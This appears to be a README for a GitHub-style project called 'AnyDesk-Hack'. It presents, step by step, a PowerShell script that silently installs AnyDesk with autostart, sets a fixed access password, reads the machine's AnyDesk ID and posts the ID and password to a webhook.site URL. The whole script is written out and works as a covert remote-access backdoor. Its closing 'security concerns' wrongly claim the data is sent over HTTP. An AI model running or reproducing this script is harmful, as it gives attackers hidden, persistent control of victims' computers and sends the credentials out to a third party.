# AnyDesk-Hack
This PowerShell script automates the download, installation, and configuration of AnyDesk, a remote desktop software, and then sends the AnyDesk ID and password to a webhook URL. Below is a detailed explanation of each part of the script

1. Download AnyDesk Executable
powershell
Copy
$url = "https://download.anydesk.com/AnyDesk.exe"
$outputPath = "C:\AnyDesk.exe"

Invoke-WebRequest -Uri $url -OutFile $outputPath
Purpose: Downloads the AnyDesk executable from the specified URL and saves it to C:\AnyDesk.exe.

Explanation:

$url: The URL of the AnyDesk executable.

$outputPath: The local path where the downloaded file will be saved.

Invoke-WebRequest: A PowerShell cmdlet used to send HTTP requests. Here, it downloads the file.

2. Install AnyDesk Silently
powershell
Copy
C:\AnyDesk.exe --install "C:\Program Files (x86)\AnyDesk" --start-with-win --silent
Purpose: Installs AnyDesk silently (without user interaction) to the specified directory and configures it to start with Windows.

Explanation:

--install: Specifies the installation directory (C:\Program Files (x86)\AnyDesk).

--start-with-win: Configures AnyDesk to start automatically when Windows starts.

--silent: Performs the installation without showing any user interface.

3. Wait for Installation to Complete
powershell
Copy
Start-Sleep -Seconds 5
Purpose: Pauses the script for 5 seconds to allow the installation to complete.

Explanation:

Start-Sleep: A PowerShell cmdlet that pauses the script for a specified number of seconds.

4. Set AnyDesk Password
powershell
Copy
cmd /c 'echo Aa123456! | "C:\Program Files (x86)\AnyDesk\AnyDesk.exe" --set-password'
Purpose: Sets the AnyDesk password to Aa123456!.

Explanation:

cmd /c: Executes a command in the command prompt and then terminates.

echo Aa123456!: Outputs the password (Aa123456!) and pipes it to the AnyDesk executable.

--set-password: A command-line argument for AnyDesk to set the password.

5. Retrieve AnyDesk ID
powershell
Copy
Start-Process -FilePath "C:\Program Files (x86)\AnyDesk\AnyDesk.exe" -ArgumentList "--get-id" -RedirectStandardOutput "C:\Program Files (x86)\AnyDesk\AnyDesk_Output.txt" -NoNewWindow -Wait

$ID = Get-Content -Path "C:\Program Files (x86)\AnyDesk\AnyDesk_Output.txt" | ForEach-Object { $_.Trim() }
Purpose: Retrieves the AnyDesk ID and saves it to a variable.

Explanation:

Start-Process: Launches the AnyDesk executable with the --get-id argument to retrieve the AnyDesk ID.

-RedirectStandardOutput: Redirects the output of the command to a text file (AnyDesk_Output.txt).

-NoNewWindow: Ensures the command runs in the same window.

-Wait: Waits for the process to complete before continuing.

Get-Content: Reads the contents of the output file.

ForEach-Object { $_.Trim() }: Trims any extra spaces or newlines from the retrieved AnyDesk ID.

6. Send AnyDesk ID and Password to Webhook
powershell
Copy
$webhookUrl = "https://webhook.site/faa03760-2397-4f6a-b086-dfe52612c830"

Invoke-WebRequest -Uri $webhookUrl -Method Post -Body "AnyDesk ID is: $ID AND Password is: Aa123456!"
Purpose: Sends the AnyDesk ID and password to a webhook URL.

Explanation:

$webhookUrl: The URL of the webhook where the data will be sent.

Invoke-WebRequest: Sends an HTTP POST request to the webhook URL with the AnyDesk ID and password in the body.

Summary
This script:

Downloads the AnyDesk executable.

Installs AnyDesk silently.

Sets a password for AnyDesk.

Retrieves the AnyDesk ID.

Sends the AnyDesk ID and password to a webhook.

Security Concerns
Hardcoded Password: The password (Aa123456!) is hardcoded in the script, which is insecure.

Webhook URL: The webhook URL is exposed, which could lead to unauthorized access if the script is shared.

Sensitive Data: Sending sensitive information (like the AnyDesk ID and password) over HTTP (not HTTPS) is insecure.
